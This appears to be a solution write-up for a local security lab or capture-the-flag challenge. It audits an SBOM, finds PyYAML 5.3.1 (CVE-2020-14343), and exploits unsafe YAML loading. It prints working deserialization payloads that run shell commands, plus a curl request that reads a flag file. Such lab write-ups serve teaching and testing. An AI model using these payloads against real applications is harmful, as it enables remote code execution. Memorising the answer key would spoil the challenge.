# Solution: A03 Easy — Known Component CVE & SBOM Dependency Audit

### Reconnaissance & SBOM Audit
1. Navigate to the running lab on `http://127.0.0.1:6007/` or query the SBOM endpoint directly:
   ```bash
   curl -s http://127.0.0.1:6007/api/v1/sbom | jq .
   ```
2. In the components array, notice:
   ```json
   {
     "name": "PyYAML",
     "version": "5.3.1",
     "purl": "pkg:pypi/pyyaml@5.3.1"
   }
   ```
3. Checking NVD / GitHub Security Advisory for `PyYAML 5.3.1` discloses **CVE-2020-14343**: arbitrary code execution when untrusted input is parsed with `yaml.load(data, Loader=yaml.Loader)`.

### Crafting the Exploit Payload
PyYAML supports Python object application tags:
```yaml
!!python/object/apply:subprocess.check_output
  - ["cat", "/flag.txt"]
```
Alternatively:
```yaml
!!python/object/apply:os.popen
  - "cat /flag.txt"
```

### Execution & Flag Retrieval
Send the payload to `/api/v1/telemetry/parse`:
```bash
curl -s -X POST http://127.0.0.1:6007/api/v1/telemetry/parse \
  -H "Content-Type: application/json" \
  -d '{"manifest": "!!python/object/apply:subprocess.check_output [[\"cat\", \"/flag.txt\"]]"}'
```

Response:
```json
{
  "success": true,
  "message": "Telemetry manifest parsed successfully by AeroGrid Engine.",
  "data": "RTSA{a03-easy_...}\n"
}
```
Submit the flag to the OSWAp portal.
